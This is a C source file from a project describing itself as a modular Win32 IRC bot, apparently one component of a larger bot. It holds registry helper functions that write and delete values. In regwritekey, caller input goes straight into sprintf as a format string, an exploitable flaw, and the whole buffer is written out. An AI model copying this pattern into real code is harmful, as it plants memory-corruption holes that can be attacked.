/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "bot.h"

//Write DWORD To Registry
bool regwritedword(HKEY hKey, char *szPath, char *szKey, DWORD dwValue)
{
	HKEY rk = NULL;

#ifndef NO_DEBUG
		printf("[DEBUG] Writing registry dword, regwritedword()...\n");
#endif

	if (RegCreateKeyEx(hKey, szPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &rk,0) != ERROR_SUCCESS) return FALSE;
	if (RegSetValueEx(rk, szKey, 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD)) != ERROR_SUCCESS) return FALSE;
		RegCloseKey(rk);
		return TRUE;
}

//Write Key To Registry
bool regwritekey(HKEY hKey, char *szPath, char *szKey, char *szValue)
{
	HKEY rk = NULL;
	char szVal[MEDBUF];

#ifndef NO_DEBUG
		printf("[DEBUG] Writing registry key, regwritekey()...\n");
#endif

		sprintf(szVal, szValue);
	if (RegCreateKeyEx(hKey, szPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &rk, NULL) != ERROR_SUCCESS) return FALSE;
	if (RegSetValueEx(rk, szKey, 0, REG_SZ, (const unsigned char *)&szVal, sizeof(szVal)) != ERROR_SUCCESS) return FALSE;
		RegCloseKey(rk);
		return TRUE;
}

//Delete Key From Registry
bool regdeletekey(HKEY hKey, char *szPath, char *szKey)
{
	HKEY rk = NULL;

#ifndef NO_DEBUG
		printf("[DEBUG] Deleting registry key, regdeletekey()...\n");
#endif

	if (RegCreateKeyEx(hKey, szPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &rk, NULL) != ERROR_SUCCESS) return FALSE;
	if (RegDeleteValue(rk, szKey) != ERROR_SUCCESS) return FALSE;
		RegCloseKey(rk);
		return TRUE;
}